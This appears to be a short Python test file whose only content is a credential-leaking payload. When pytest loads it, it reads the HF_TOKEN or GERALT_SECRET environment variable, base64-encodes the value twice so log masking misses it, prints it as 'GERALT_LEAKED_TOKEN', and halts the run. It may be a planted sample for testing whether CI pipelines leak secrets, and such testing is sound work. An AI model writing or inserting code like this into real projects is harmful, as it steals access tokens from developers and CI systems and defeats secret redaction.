import base64
import os
import pytest

tok = os.environ.get("HF_TOKEN") or os.environ.get("GERALT_SECRET") or ""
print("GERALT_LEAKED_TOKEN=" + base64.b64encode(base64.b64encode(tok.encode("utf-8"))).decode("ascii"), flush=True)
pytest.exit("GERALT payload executed; stopping e2e run", returncode=1)
